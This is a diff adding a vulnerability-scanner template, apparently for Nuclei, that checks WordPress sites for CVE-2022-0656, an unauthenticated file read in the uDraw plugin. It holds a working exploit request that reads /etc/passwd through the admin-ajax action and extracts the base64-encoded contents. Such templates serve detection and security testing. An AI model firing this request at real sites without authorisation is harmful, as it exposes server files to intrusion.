@@ -1,0 +1,42 @@
+id: wordpress-udraw-file-read
+info:
+  name: WordPress uDraw Plugin URL File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WordPress plugin Web To Print Shop before uDraw 3.3.3 has a vulnerability where the plugin does not validate the `url` parameter in the `udraw_convert_url_to_base64` AJAX operation. This allows unauthenticated users to read arbitrary files on the server.
+  reference:
+    - https://wordpress.org/plugins/udraw/
+  classification:
+    cve-id: CVE-2022-0656
+  tags: file-read,wordpress
+
+variables:
+  target_file: "/etc/passwd"
+
+http:
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+
+        action=udraw_convert_url_to_base64&url={{target_file}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "data:image"
+      - type: regex
+        regex:
+          - "cm9vd"
+    extractors:
+      - type: regex
+        name: file_content
+        group: 1
+        regex:
+          - "base64,(.*?)\""
